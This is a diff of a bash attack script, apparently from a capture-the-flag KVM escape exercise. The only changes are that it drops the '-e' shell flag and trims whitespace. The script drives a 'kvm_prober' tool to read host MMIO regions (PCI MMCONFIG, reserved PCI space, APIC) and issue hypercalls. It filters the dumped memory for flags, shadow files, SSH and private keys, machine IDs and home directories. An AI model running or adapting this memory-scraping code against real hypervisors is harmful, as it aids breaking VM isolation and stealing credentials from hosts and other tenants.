@@ -1,5 +1,5 @@
 #!/bin/bash
-set -euo pipefail
+set -uo pipefail
 
 # ---- CONFIG ----
 READ_ADDR1=0x26279a8
@@ -82,16 +82,16 @@ for out_addr in $OUTSIDE_RAM1 $OUTSIDE_RAM2; do
     log "[*] OUTSIDE RAM: Reading 128 bytes at $out_addr :"
     # Scan start of PCI MMCONFIG (billionth range)
     kvm_prober scanmmio 0xb0000000 0xb0010000 128 | xxd -r -p | strings | grep -iE 'ctf|CTF|shadow|ssh|PRIVATE|machine-id|/root|/home' | tee -a "pci-mmconfig-scan.txt"
-    hypercall_resp=$(call_hypercall 2>&1) 
-    
+    hypercall_resp=$(call_hypercall 2>&1)
+
     # Scan big PCI reserved
     kvm_prober scanmmio 0xfc000000 0xfc100000 128 | xxd -r -p | strings | grep -iE 'ctf|CTF|shadow|ssh|PRIVATE|machine-id|/root|/home' | tee -a "big-pci-scan.txt"
     hypercall_resp=$(call_hypercall 2>&1)
-    
+
     # Scan APIC area (just for fun)
     kvm_prober scanmmio 0xfee00000 0xfee01000 128 | xxd -r -p | strings | grep -iE 'ctf|CTF|shadow|ssh|PRIVATE|machine-id|/root|/home' | tee -a "apic-scan.txt"
     hypercall_resp=$(call_hypercall 2>&1)
-    
+
     log ""
     log "[*] OUTSIDE RAM: Strings found:"
     kvm_prober readmmio_buf "$out_addr" "$OUT_SIZE" | xxd -r -p | strings | tee -a "$REPORT"
